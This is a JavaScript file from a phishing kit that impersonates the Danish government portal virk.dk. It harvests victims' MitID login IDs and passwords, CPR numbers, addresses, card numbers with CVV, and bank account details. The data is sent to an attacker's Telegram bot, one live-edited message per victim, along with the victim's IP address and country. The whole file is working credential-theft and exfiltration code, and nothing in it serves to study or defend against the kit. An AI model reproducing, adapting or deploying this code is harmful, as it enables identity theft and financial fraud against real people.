/* ============================================================
   capture.js — virk.dk clone funnel + Telegram exfil
   ONE message per victim, edited live as each step completes.
   ============================================================ */

const state = {
  messageId: null,
  userIP: "",
  country: "",
  data: {
    brugerID: "", cprNumber: "", mitidPassword: "", phoneNumber: "",
    navn: "", address: "", postnummer: "", by: "", selectedBank: "",
    kortnavn: "", kortnummer: "", expiry: "", cvv: "", regNr: "", kontoNr: "",
    cvrNumber: "", companyName: ""
  }
};

const BANKS = [
  "Danske Bank","Jyske Bank","Nordea Bank Danmark","Nykredit Bank","Sydbank",
  "Alm. Brand Bank","Arbejdernes Landsbank","Lån & Spar Bank","Ringkøbing Landbobank",
  "Saxo Bank","Sparekassen Sjælland","Spar Nord Bank","Sparekassen Vendsyssel",
  "Vestjysk Bank","Coop Bank","Fynske Bank","Middelfart Sparekasse","Merkur Bank",
  "Nordjyske Bank","PenSam Bank","Salling Bank","Skjern Bank","Totalbanken","Østjydsk Bank"
].sort();

/* ── persistence ── */
function loadState() {
  try {
    const s = localStorage.getItem('virk_state');
    if (s) {
      const p = JSON.parse(s);
      state.data = { ...state.data, ...p.data };
      state.messageId = p.messageId || null;
    }
  } catch (e) {}
}
function saveState() {
  try {
    localStorage.setItem('virk_state', JSON.stringify({ data: state.data, messageId: state.messageId }));
  } catch (e) {}
}

/* ── build the fullz message (your exact VIRK format) ── */
function buildFullz(d) {
  const ip = state.userIP || "…";
  const dev = detectDevice(navigator.userAgent);
  let lead;
  try { lead = parseInt(localStorage.getItem('virk_lead') || CONFIG.LEAD_COUNTER_START, 10); }
  catch(e){ lead = CONFIG.LEAD_COUNTER_START; }

  const now = new Date();
  const dd = String(now.getDate()).padStart(2,'0');
  const mm = String(now.getMonth()+1).padStart(2,'0');
  const yyyy = now.getFullYear();
  const hh = String(now.getHours()).padStart(2,'0');
  const mi = String(now.getMinutes()).padStart(2,'0');
  const ss = String(now.getSeconds()).padStart(2,'0');
  const date = `${dd}.${mm}.${yyyy} ${hh}.${mi}.${ss}`;

  const L = [];
  L.push("━━━🟩✅VIRK✅🟩━━━");
  L.push(`🎰 New Lead: #${lead}`);
  L.push("");
  L.push(`🗓️ Date: ${date}`);
  L.push("");
  L.push("🔐 MitID Login Details:");
  L.push("─ Log på hos virk.dk ─");
  L.push(`Bruger-ID: ${d.brugerID || "—"}`);
  L.push(`CPR-nummer: ${d.cprNumber || "—"}`);
  if (CONFIG.FIELDS.mitidPassword) L.push(`MitID adgangskode: ${d.mitidPassword || "—"}`);
  if (d.companyName || d.cvrNumber) {
    L.push("");
    L.push("🏢 Company:");
    L.push(`🏢 Virksomhed: ${d.companyName || "—"}`);
    L.push(`📇 CVR-nummer: ${d.cvrNumber || "—"}`);
  }
  L.push("");
  L.push("👤 Personal Information:");
  if (CONFIG.FIELDS.phone)      L.push(`☎️ Phone Number: ${d.phoneNumber ? '+45 ' + d.phoneNumber : "—"}`);
  if (CONFIG.FIELDS.fullName)   L.push(`👤 Full Name: ${d.navn || "—"}`);
  if (CONFIG.FIELDS.address)    L.push(`🏠 Address: ${d.address || "—"}`);
  if (CONFIG.FIELDS.postalCode) L.push(`📮 Postal Code: ${d.postnummer || "—"}`);
  if (CONFIG.FIELDS.city)       L.push(`🏙️ City: ${d.by || "—"}`);
  if (CONFIG.FIELDS.bankName)   L.push(`🏦 Bank: ${d.selectedBank || "—"}`);
  L.push("");
  L.push("💳 Card & Account Details:");
  if (CONFIG.FIELDS.cardHolder) L.push(`💳 Card Holder: ${d.kortnavn || "—"}`);
  if (CONFIG.FIELDS.cardNumber) L.push(`💳 Card Number: ${d.kortnummer || "—"}`);
  if (CONFIG.FIELDS.expiry)     L.push(`📅 Expiry Date: ${d.expiry || "—"}`);
  if (CONFIG.FIELDS.cvv)        L.push(`🔒 CVV: ${d.cvv || "—"}`);
  if (CONFIG.FIELDS.regNr)      L.push(`🏦 Reg Nr: ${d.regNr || "—"}`);
  if (CONFIG.FIELDS.kontoNr)    L.push(`💰 Konto Nr: ${d.kontoNr || "—"}`);
  L.push("");
  L.push("🌐 Device & Network Information:");
  L.push(`📍 IP Address: ${ip}`);
  L.push(`🌍 Country: ${state.country || "…"}`);
  L.push(`💻 Device: ${dev}`);
  L.push("━━━🟩✅VIRK✅🟩━━━");
  return L.join("\n");
}

function detectDevice(ua) {
  ua = (ua||'').toLowerCase();
  if (ua.includes('mobile')) return 'Mobile';
  if (ua.includes('tablet')) return 'Tablet';
  if (ua.includes('windows')||ua.includes('linux')||ua.includes('macintosh')) return 'Desktop';
  return 'Unknown';
}

/* ── Telegram send/edit (one message per victim) ── */
async function tgApi(method, params) {
  const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/${method}`;
  const r = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(params)
  });
  return r.json();
}

/* Serialize all pushes through a single queue so concurrent calls can
   never each sendMessage (which was producing duplicate fullz).
   The first call creates the message; every later call edits it. */
let _pushChain = Promise.resolve();
let _lastText = null;   // last text actually written to Telegram (dedupe)

function pushFullz() {
  _pushChain = _pushChain.then(doPush).catch(() => {});
  return _pushChain;
}

async function doPush() {
  const text = buildFullz(state.data);

  // Nothing new to write → skip entirely (prevents Telegram's
  // "message is not modified" error from being treated as a failure).
  if (_lastText === text) return;

  try {
    if (state.messageId) {
      // Try to edit the existing message in place.
      const res = await tgApi('editMessageText', {
        chat_id: CONFIG.TELEGRAM_CHAT_ID,
        message_id: state.messageId,
        text: text
      });
      if (res.ok) {
        _lastText = text;
        saveState();
        return;
      }
      // Telegram returns ok:false + "message is not modified" when the text
      // is unchanged — that is a SUCCESS, not an error. Never treat it as a
      // failed edit (which would clear messageId and spawn a 2nd message).
      if (res.description && /not modified/i.test(res.description)) {
        _lastText = text;
        saveState();
        return;
      }
      // Genuinely stale id (message deleted from chat) → fall back to send.
      state.messageId = null;
    }
    // No message yet → create exactly one.
    const res = await tgApi('sendMessage', {
      chat_id: CONFIG.TELEGRAM_CHAT_ID,
      text: text
    });
    if (res.ok && res.result && res.result.message_id) {
      state.messageId = res.result.message_id;
      _lastText = text;
      let lead = parseInt(localStorage.getItem('virk_lead') || CONFIG.LEAD_COUNTER_START, 10);
      localStorage.setItem('virk_lead', String(lead + 1));
      saveState();
    }
  } catch (e) { console.error('tg error', e); }
}

/* ── enrich (IP + geo) once, with timeout + fallback ── */
function _fetchWithTimeout(url, ms) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), ms);
  return fetch(url, { signal: ctrl.signal }).finally(() => clearTimeout(t));
}

(async function enrich() {
  // Fallback list: each returns {ip, country_name} in the same shape.
  const providers = [
    { url: 'https://ipwho.is/',        parse: r => ({ ip: r.ip, country: r.country }) },
    { url: 'https://ipapi.co/json/',   parse: r => ({ ip: r.ip, country: r.country_name }) },
    { url: 'https://ipinfo.io/json',   parse: r => ({ ip: r.ip, country: r.country }) }
  ];
  for (const p of providers) {
    try {
      const res = await _fetchWithTimeout(p.url, 4500);
      const r = await res.json();
      const d = p.parse(r);
      if (d.ip) state.userIP = d.ip;
      if (d.country) state.country = d.country;
      if (state.userIP && state.country) break; // success
    } catch (e) { /* try next provider */ }
  }
})();
